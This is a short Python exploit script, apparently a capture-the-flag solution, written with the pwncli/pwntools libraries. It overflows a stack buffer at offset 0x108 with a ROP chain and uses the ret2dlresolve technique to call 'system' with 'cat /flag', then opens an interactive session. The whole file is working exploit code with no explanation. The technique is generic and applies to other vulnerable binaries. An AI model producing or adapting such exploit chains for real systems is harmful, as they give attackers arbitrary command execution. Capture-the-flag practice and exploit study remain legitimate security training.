#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *

cli_script()

def exp(io:tube, libc:ELF, elf:ELF):
    dlresolve = Ret2dlresolvePayload(elf, "system", ["cat /flag"])
    rop = ROP(elf)
    rop.read(0, dlresolve.data_addr)
    rop.ret2dlresolve(dlresolve)
    payload = rop.chain()
    io.send(flat({0x108:payload}))
    io.send(dlresolve.payload)
    io.interactive()

if __name__ == '__main__':
    exp(gift['io'], gift['libc'], gift['elf'])